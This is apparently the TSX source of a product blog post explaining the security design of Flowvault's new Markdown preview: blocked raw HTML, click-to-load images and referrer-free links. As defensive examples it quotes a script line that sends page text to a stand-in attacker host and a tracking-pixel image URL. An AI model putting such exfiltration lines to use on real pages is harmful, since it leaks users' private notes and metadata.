import {
  Lead,
  H2,
  P,
  Ul,
  Ol,
  Li,
  Code,
  Strong,
  Em,
  Callout,
  Example,
} from "@/components/blog/Prose";

export default function Post() {
  return (
    <>
      <Lead>
        Flowvault v1.3 renders your notes as GitHub-flavored Markdown,
        with syntax-highlighted code blocks and a toolbar toggle
        between Edit, Preview, and Split views. That bit is not
        unusual. What <Em>is</Em> unusual is what the preview
        deliberately refuses to do: it doesn&apos;t execute HTML,
        it doesn&apos;t silently load external images, and it
        doesn&apos;t leak a referrer when you click a link. For a
        zero-knowledge notepad, the renderer is just as much a
        threat-model surface as the crypto &mdash; so this post
        explains exactly what we shipped, and exactly what we chose
        not to.
      </Lead>

      <H2 id="what-ships">What actually ships</H2>
      <P>
        Open any Flowvault notebook and look at the top-right of the
        editor toolbar: you&apos;ll see a new segmented control with{" "}
        <Strong>Edit</Strong>, <Strong>Preview</Strong>, and (on wide
        enough viewports) <Strong>Split</Strong>. Your notes are
        still stored as plain Markdown text inside the same fixed-size
        encrypted slot; the preview is a <Em>view</Em> over those
        bytes, not a separate document. Save shortcuts, dirty-state
        tracking, optimistic concurrency, and <Code>.fvault</Code>{" "}
        export all keep working identically &mdash; switching view
        modes doesn&apos;t touch the ciphertext.
      </P>
      <P>
        The toggle preference lives in <Code>localStorage</Code>, not
        in the vault, on purpose. Your 512 KiB slot is precious. What
        view mode you prefer on your own device is UI state, not
        content, and we&apos;d rather not spend bytes of hidden-volume
        space on it.
      </P>

      <H2 id="flavor">Which Markdown flavor?</H2>
      <P>
        GitHub-flavored Markdown, via <Code>react-markdown</Code> plus
        the <Code>remark-gfm</Code> plugin. Concretely that means:
      </P>
      <Ul>
        <Li>Headings, paragraphs, hard and soft line breaks.</Li>
        <Li>
          Bold, italic, and <Code>~~strikethrough~~</Code>.
        </Li>
        <Li>
          Ordered / unordered lists, nested lists, and{" "}
          <Strong>task lists</Strong> (
          <Code>- [x] done</Code>) &mdash; which are actually useful
          for a private notepad.
        </Li>
        <Li>Tables, blockquotes, horizontal rules.</Li>
        <Li>
          Inline code and fenced code blocks with per-language
          syntax highlighting.
        </Li>
        <Li>
          Autolinks (<Code>&lt;https://…&gt;</Code>) and standard
          link syntax.
        </Li>
        <Li>Images, gated behind the click-to-load pattern below.</Li>
      </Ul>
      <P>
        That&apos;s it for v1.3. You won&apos;t find Mermaid diagrams
        or KaTeX math, and that&apos;s a deliberate trade: each would
        add &gt;100 KB to the bundle for a niche use case, and both
        introduce their own parser-shaped attack surfaces. If you
        need either, open an issue &mdash; but the default is lean.
      </P>

      <H2 id="html-blocked">Why raw HTML is blocked, and will stay blocked</H2>
      <P>
        Every popular Markdown renderer has a quietly-terrifying
        capability: <Code>&lt;script&gt;</Code>, <Code>&lt;iframe&gt;</Code>,{" "}
        <Code>&lt;object&gt;</Code>, <Code>&lt;img onerror=…&gt;</Code>{" "}
        and friends, embedded directly inside Markdown, will happily
        execute in a preview unless the renderer explicitly
        refuses. Some apps &ldquo;sanitise&rdquo; HTML with an allow-list.
        Flowvault just <Strong>refuses</Strong>. Raw HTML passes
        through as literal text.
      </P>
      <Example>{`<!-- In a Flowvault note: this renders as visible text, not as a tag -->
<script>fetch("https://attacker/x?data=" + document.body.innerText)</script>`}</Example>
      <P>
        Two reasons. First, Flowvault&apos;s pitch is that the server
        can&apos;t read your notes. That claim collapses the moment a
        rendered <Code>&lt;script&gt;</Code> can reach out of the
        browser carrying your plaintext &mdash; a vault that
        self-exfiltrates on unlock is strictly worse than no
        encryption at all. Second, vaults are{" "}
        <Em>handed around</Em>: a trusted-handover beneficiary
        inherits a vault they didn&apos;t write, a{" "}
        <Code>.fvault</Code> file can be restored from one self-host
        to another, and decoy notebooks might be pre-seeded by a
        collaborator. Rendering arbitrary HTML from content you
        didn&apos;t author is self-XSS-as-a-service. We keep the
        rule simple: no tags, no toggles, no &ldquo;advanced mode.&rdquo;
      </P>
      <Callout>
        The practical loss is small. Markdown already covers tables,
        code blocks, lists, headings, and emphasis. The things you
        &ldquo;need HTML for&rdquo; in a private notepad are usually
        things you shouldn&apos;t be embedding anyway (remote iframes,
        custom styles, tracking pixels).
      </Callout>

      <H2 id="external-images">External images are click-to-load, always</H2>
      <P>
        Markdown&apos;s <Code>![alt](url)</Code> syntax issues an
        HTTP GET the moment the preview mounts, and that GET is a
        perfect covert channel. Consider:
      </P>
      <Example>{`![pricing chart](https://attacker.example/px.gif?v=target&t=1714000000)`}</Example>
      <P>
        If Flowvault rendered that line directly, three things would
        leak the instant you unlocked a vault containing it: your
        IP address (and rough geolocation), your browser fingerprint,
        and the exact wall-clock time of unlock. If a hostile party
        can arrange for that Markdown to appear in <Em>your</Em>{" "}
        vault &mdash; e.g. by handing you a <Code>.fvault</Code>{" "}
        backup to restore, by pre-seeding a decoy, or by being a
        collaborator on a shared URL &mdash; they&apos;ve built a
        tripwire that fires the moment you log in.
      </P>
      <P>
        Flowvault blocks that channel. External images render as a
        placeholder that shows the exact URL they would load, with
        an explicit &ldquo;<Strong>Load image</Strong>&rdquo; button
        that warns the click will send a request to the host. You
        get full informed consent before a single pixel crosses the
        network. And when you do load it, we still set{" "}
        <Code>referrerPolicy=&quot;no-referrer&quot;</Code>, so the
        destination host doesn&apos;t learn which Flowvault URL or
        local file the image was embedded in.
      </P>
      <P>
        Inline base64 <Code>data:</Code> images render immediately,
        because they&apos;re part of the vault bytes you just
        decrypted &mdash; no network request, no leak.
      </P>

      <H2 id="links">External links without referrers</H2>
      <P>
        Every external link the preview renders is hardened the same
        way:
      </P>
      <Ul>
        <Li>
          <Code>target=&quot;_blank&quot;</Code> so Flowvault
          doesn&apos;t navigate away (you&apos;d lose an unsaved
          draft).
        </Li>
        <Li>
          <Code>rel=&quot;noopener&quot;</Code> so the destination
          page can&apos;t reach back into the tab that opened it.
        </Li>
        <Li>
          <Code>rel=&quot;noreferrer&quot;</Code> +{" "}
          <Code>referrerPolicy=&quot;no-referrer&quot;</Code> so the
          destination site never learns which Flowvault URL or
          slug was the source.
        </Li>
      </Ul>
      <P>
        Non-HTTP URLs (<Code>javascript:</Code>,{" "}
        <Code>data:</Code> in link position, custom schemes) render
        as styled text rather than as clickable links, so there&apos;s
        no &ldquo;click to execute&rdquo; path through the preview.
      </P>

      <H2 id="highlighting">Syntax highlighting, entirely offline</H2>
      <P>
        Code blocks are highlighted by{" "}
        <Code>prism-react-renderer</Code>, which ships with the
        preview bundle and runs entirely in the browser. That matters
        because the alternative pattern &mdash; lazy-loading a
        language grammar on first use, or fetching a theme from a
        CDN &mdash; would turn every fenced code block into an
        outbound network hop. Flowvault&apos;s no-third-party posture
        extends here: once the preview bundle is cached, writing,
        editing, and rendering code blocks offline is fully
        functional, and nothing leaves your browser.
      </P>
      <P>
        Language detection uses the fence label:
      </P>
      <Example>{`\`\`\`ts
export interface VaultRecord {
  ciphertext: Uint8Array;
  version: number;
}
\`\`\``}</Example>
      <P>
        All common languages work (TypeScript, Rust, Go, Python, C,
        Bash, JSON, YAML, SQL, and so on). Unknown fences render as
        plain monospace without highlighting rather than crashing.
      </P>

      <H2 id="lazy-loaded">The preview bundle is lazy-loaded</H2>
      <P>
        The entire Markdown + GFM + Prism toolchain weighs in at
        ~90 KB gzipped, which is fine for a single page but would be
        silly to pay on every vault open when plenty of users prefer
        plain text. Flowvault solves this the obvious way: the
        preview component is imported through <Code>next/dynamic</Code>{" "}
        with <Code>ssr: false</Code>, so it&apos;s downloaded only
        when you first switch to Preview or Split. If you live in
        Edit mode, you never pay for the feature at all &mdash; the
        main editor bundle stays the same size it was in v1.2.
      </P>

      <H2 id="split-view">Split view, responsive-by-default</H2>
      <P>
        Split view is the power-user mode: Markdown on the left,
        rendered preview on the right, scrolling independently. It
        appears only on viewports above ~900 px, because stacking two
        columns that tight on a phone is worse than either one alone.
      </P>
      <P>
        When the viewport is narrower, the Split toggle hides itself
        and the effective mode collapses to Preview (or Edit,
        whichever you last chose). Crucially we store your{" "}
        <Em>intent</Em> (&ldquo;split&rdquo;) rather than the
        effective mode, so the next time you open the vault on a
        laptop the layout comes back without you touching the
        toggle.
      </P>

      <H2 id="no-wysiwyg">Why there&apos;s no WYSIWYG</H2>
      <P>
        The obvious product-shaped next step is a live WYSIWYG layer
        &mdash; type <Code>**bold**</Code> and watch it become bold
        in place, Notion-style. We thought about it and passed, for
        two reasons:
      </P>
      <Ol>
        <Li>
          <Strong>Bundle size.</Strong> A real WYSIWYG Markdown
          editor (TipTap / ProseMirror / Lexical) adds hundreds of
          KB of framework code. That&apos;s a lot for users who
          just wanted some bold text.
        </Li>
        <Li>
          <Strong>Portability.</Strong> One of Flowvault&apos;s
          invariants is that your notes are plain Markdown text, not
          a proprietary JSON document tree. That keeps the{" "}
          <Code>.fvault</Code> backup format simple, keeps the
          plaintext <Code>.zip</Code> export a pile of real{" "}
          <Code>.md</Code> files, and keeps self-hosters from
          having to ship a serialiser on upgrade. A WYSIWYG layer
          tends to quietly erode that invariant.
        </Li>
      </Ol>
      <P>
        Edit / Preview / Split is the compromise: you see the
        rendering without hiding the source, and the source stays
        the thing that&apos;s encrypted.
      </P>

      <H2 id="threat-model-recap">The preview&apos;s threat-model recap</H2>
      <P>
        A quick checklist, since this is a security-first product:
      </P>
      <Ul>
        <Li>
          <Strong>What the server sees:</Strong> unchanged. Still
          just the opaque ciphertext blob. Markdown rendering is
          entirely client-side, after decryption.
        </Li>
        <Li>
          <Strong>What a malicious note can do:</Strong> render
          misleading <Em>text</Em>, nothing more. No scripts, no
          iframes, no silent image pings, no trackable link clicks.
        </Li>
        <Li>
          <Strong>What a malicious <Code>.fvault</Code> restore can
          do:</Strong> same answer. The restore path writes opaque
          ciphertext; opening it goes through the same renderer
          with the same defaults.
        </Li>
        <Li>
          <Strong>What a browser extension can still do:</Strong>{" "}
          read the rendered DOM in your origin, same as it could
          before. The Markdown preview doesn&apos;t change that
          threat model; extension-level adversaries remain out of
          scope (same caveat as every browser-based crypto app).
        </Li>
      </Ul>

      <H2 id="whats-next">What&apos;s next</H2>
      <P>
        Short list of things that would ship if there&apos;s demand:
      </P>
      <Ul>
        <Li>
          <Strong>Per-tab default mode</Strong> &mdash; so a prose
          tab opens in Preview while a &ldquo;scratchpad&rdquo; tab
          opens in Edit.
        </Li>
        <Li>
          <Strong>Mermaid diagrams</Strong> as an opt-in, separately
          lazy-loaded module.
        </Li>
        <Li>
          <Strong>KaTeX math</Strong>, same pattern.
        </Li>
        <Li>
          <Strong>Copy-button on code blocks</Strong>, because
          everyone wants it eventually.
        </Li>
      </Ul>
      <P>
        None of these change the security posture of the renderer
        &mdash; the invariants &ldquo;no HTML, no silent network,
        no referrer&rdquo; carry through. Open a{" "}
        <a
          href="https://github.com/Flowdesktech/flowvault/issues/new"
          target="_blank"
          rel="noreferrer"
        >
          GitHub issue
        </a>{" "}
        for the ones you&apos;d actually use; that&apos;s what
        drives the priority.
      </P>

      <H2 id="try-it">Try it</H2>
      <P>
        Open any existing Flowvault notebook and click the new
        Preview toggle; every note you&apos;ve ever saved will
        render as Markdown without you changing a byte. It&apos;s
        backwards-compatible with every previous version, works on
        hosted vaults and Bring-Your-Own-Storage local vaults
        alike, and it costs zero bytes of your slot to enable.
        Welcome to a notepad that finally renders what you wrote.
      </P>
    </>
  );
}
